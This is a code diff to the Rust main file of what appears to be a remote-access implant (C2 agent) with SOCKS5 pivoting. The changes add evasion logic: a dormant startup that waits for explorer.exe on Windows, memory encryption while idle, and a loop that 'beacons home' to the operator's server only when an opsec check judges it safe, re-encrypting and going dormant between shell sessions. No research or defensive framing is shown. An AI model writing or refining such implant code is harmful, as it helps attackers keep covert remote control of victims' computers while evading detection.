@@ -11,16 +11,15 @@ use crate::dormant::MemoryProtector;
 use crate::dormant::SensitiveState;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
 use crate::networking::socks5_pivot_server::Socks5PivotServer;
-use crate::opsec::{OpsecLevel, AgentMode, determine_agent_mode, OPSEC_STATE};
-use crate::util::random_jitter;
-use log::{info, warn, error, debug};
+use crate::opsec::{AgentMode, determine_agent_mode};
+use log::{info, warn, error};
 use once_cell::sync::Lazy;
-use rand::Rng;
 use std::env;
 use std::sync::Arc;
 use std::sync::Mutex;
 use std::time::Duration;
-use tokio::time;
+use std::ffi::OsStr;
+use sysinfo::{System, RefreshKind};
 
 static MEMORY_PROTECTOR: Lazy<Mutex<MemoryProtector>> = Lazy::new(|| {
     Mutex::new(MemoryProtector::new(SensitiveState {
@@ -35,13 +34,12 @@ static MEMORY_PROTECTOR: Lazy<Mutex<MemoryProtector>> = Lazy::new(|| {
 // It checks for the presence of explorer.exe and waits for up to 10 minutes
 #[cfg(target_os = "windows")]
 fn dormant_startup() {
-    use sysinfo::{System, SystemExt, ProcessExt};
-    let mut sys = System::new_all();
+    let mut sys = System::new_with_specifics(RefreshKind::everything());
     let start = std::time::Instant::now();
     // Wait up to 10 minutes or until explorer.exe is running
     while start.elapsed().as_secs() < 600 {
-        sys.refresh_processes();
-        if sys.processes_by_name("explorer.exe").next().is_some() {
+        sys.refresh_specifics(RefreshKind::everything());
+        if sys.processes_by_name(OsStr::new("explorer.exe")).next().is_some() {
             break;
         }
         std::thread::sleep(std::time::Duration::from_secs(5));
@@ -94,17 +92,53 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .unwrap_or_else(|| config.get_server_url());
     
     let agent_id = config.payload_id.clone();
-    println!("[INFO] Agent ID: {}", agent_id);
-    println!("[INFO] Using embedded configuration");
+    info!("[INFO] Agent ID: {}", agent_id);
+    info!("[INFO] Using embedded configuration");
+
+    // Start in FullOpsec mode
+    {
+        let mut protector = MEMORY_PROTECTOR.lock().unwrap();
+        protector.protect();
+    }
 
     info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);
 
-    // Only call run_shell ONCE; all polling/sleeping is handled inside run_shell
-    if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
-        error!("[ERROR] Shell error: {}. Exiting...", e);
+    //Wait until it is safe for E.T. to phone home
+    loop {
+        if determine_agent_mode() == AgentMode::BackgroundOpsec {
+            info!("[OPSEC] Safe to beacon home. Decrypting sensitive memory and starting agent.");
+            let mut protector = MEMORY_PROTECTOR.lock().unwrap();
+            protector.unprotect();
+            break;
+        } else {
+            info!("[OPSEC] Not safe to beacon home. Staying encrypted and dormant.");
+            std::thread::sleep(Duration::from_secs(5));
+        }
     }
 
-    Ok(())
+    loop {
+        if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
+            error!("[ERROR] Shell error: {}. Exiting...", e);
+        }
+        // After run_shell returns, re-encrypt and wait for safe conditions again
+        {
+            let mut protector = MEMORY_PROTECTOR.lock().unwrap();
+            protector.protect();
+        }
+        info!("[OPSEC] Returned to FullOpsec. Waiting for safe conditions...");
+        loop {
+            if determine_agent_mode() == AgentMode::BackgroundOpsec {
+                info!("[OPSEC] Safe to beacon home again. Decrypting sensitive memory and resuming agent.");
+                let mut protector = MEMORY_PROTECTOR.lock().unwrap();
+                protector.unprotect();
+                break;
+            } else {
+                std::thread::sleep(Duration::from_secs(5));
+                info!("[OPSEC] Not safe to beacon home. Staying encrypted and dormant.");
+            }
+        }
+    }
+    // Ok(())
 }
 
 fn on_mode_transition(new_mode: AgentMode) {
